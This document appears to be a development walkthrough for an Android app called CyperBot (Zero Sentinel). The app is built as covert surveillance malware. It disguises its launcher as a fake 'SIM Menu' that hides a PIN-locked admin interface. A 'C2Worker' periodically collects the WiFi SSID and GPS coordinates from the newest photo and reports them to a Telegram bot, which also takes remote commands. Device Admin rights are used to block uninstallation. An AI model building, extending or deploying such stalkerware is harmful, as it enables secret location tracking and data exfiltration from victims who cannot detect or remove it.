# Phase 4: Stealth & Persistence Walkthrough

## Overview
Implemented advanced stealth, intelligence, and security features to enhance the resilience and capability of CyperBot (Zero Sentinel).

## Changes Implemented

### 1. Stealth: SIM Toolkit Decoy
- **Changed Launcher**: Replaced `MainActivity` with `SIMMenuActivity` disguised as "SIM Menu".
- **Fake UI**: Displays a list of standard SIM services ("Search", "Favorites", etc.).
- **Trigger**: Clicking "Help and Support" prompts for a PIN.
- **PIN Access**: Entering the correct PIN (Default: `123123`) unlocks the real Admin UI (`MainActivity`).

### 2. Intelligence: Passive Monitoring
- **Trigger**: Runs every 15 minutes (approx) during the `C2Worker` cycle.
- **WiFi**: Captures current connected WiFi SSID (requires Location permission).
- **Location**: Extracts GPS coordinates from the **latest** photo in `MediaStore`.
- **Logs**: Creates a `PASSIVE` log entry with format:
  `[WIFI: <SSID>] | [LOC: https://maps.google.com/?q=<Lat>,<Lon>] | [IMG_DATE: <Date>]`

### 3. Control: PIN Management
- **Default PIN**: `123123`.
- **Remote**: Added `/setpin <new_pin>` command to Telegram Bot.
- **Local**: `MainActivity` allows setting/changing the PIN.

### 4. Security: Uninstall Protection
- **Device Admin**: Added `SentinelDeviceAdminReceiver` and policies.
- **Protection**: Prevents standard uninstallation when active.
- **UI**: Added "Enable Uninstall Protection" button to `MainActivity`.

## How to Verify

### Manual Verification Steps
1.  **Install & Launch**:
    - Build and install the app.
    - Verify the app icon is "SIM Menu" (or generic android icon if asset missing, but manifest set to `ic_sim_menu`).
    - Open app -> Should see "SIM Toolkit" list.
2.  **Unlock Admin UI**:
    - Click "Help and Support".
    - Enter `123123`.
    - Click OK -> Should open "Zero Sentinel" Admin UI.
3.  **Setup & Protection**:
    - Grant Permissions (Notification, etc.).
    - Click "Enable Uninstall Protection" -> Activate Device Admin.
    - Try to uninstall the app -> Should be blocked/greyed out.
4.  **Passive Monitoring**:
    - Connect to WiFi.
    - Take a photo with Location enabled.
    - Wait 15 mins or force run via Android Studio / ADB.
    - Check Telegram logs for `PASSIVE` entry with WiFi name and Google Maps link.
5.  **Remote PIN**:
    - Send `/setpin 9999` to the bot.
    - Close app and try to unlock with `123123` (Should fail).
    - Unlock with `9999` (Should success).

## Files Modified
- `AndroidManifest.xml`
- `C2Worker.kt`
- `CommandProcessor.kt`
- `MainActivity.kt`
- `EncryptedPrefsManager.kt`
- `SIMMenuActivity.kt` (New)
- `SentinelDeviceAdminReceiver.kt` (New)
- `activity_sim_menu.xml` (New)
- `device_admin_policies.xml` (New)
